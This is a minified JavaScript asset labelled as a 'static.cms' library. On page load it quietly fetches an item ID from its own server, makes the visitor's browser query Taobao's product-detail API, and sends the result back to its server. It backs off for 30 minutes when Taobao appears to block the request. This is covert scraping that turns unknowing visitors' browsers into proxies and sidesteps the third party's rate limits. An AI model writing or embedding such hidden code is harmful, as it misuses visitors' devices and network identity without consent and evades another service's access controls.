/**
 * static.cms - v1.0.0  License By 
 * WEB小组  
 */
!function(){var t="https://acs.m.taobao.com/h5/mtop.taobao.detail.getdetail/6.0/?appKey=12574478&api=mtop.taobao.detail.getdetail&v=6.0&type=json&dataType=json",a=window.location.pathname+"?r=index/sc",e=window.location.pathname+"?r=index/gc",n=function(t,a){var e=new Date;e.setTime(e.getTime()+18e5),document.cookie=t+"="+escape(a)+";expires="+e.toGMTString()},o=function(t){var a,e=new RegExp("(^| )"+t+"=([^;]*)(;|$)");return!!(a=document.cookie.match(e))&&unescape(a[2])},d=function(){return!o("encrypt")&&void $.ajax({url:e,type:"POST",dataType:"json",data:{t:"1"}}).done(function(t){return!(""==t.data||!t.data)&&void i(t,c.bind(this))})},i=function(a,e){$.ajax({url:t+'&data=%7B"itemNumId"%3A"'+a.data+'"%7D',type:"GET",dataType:"JSONP"}).done(function(t){return t.url||t.data.url?(n("encrypt",1),!1):(a.id=a.data,a.data=t,void e(a))})},c=function(t){$.ajax({url:a,type:"post",dataType:"json",data:{data:t}})};$(window).load(function(){d()})}();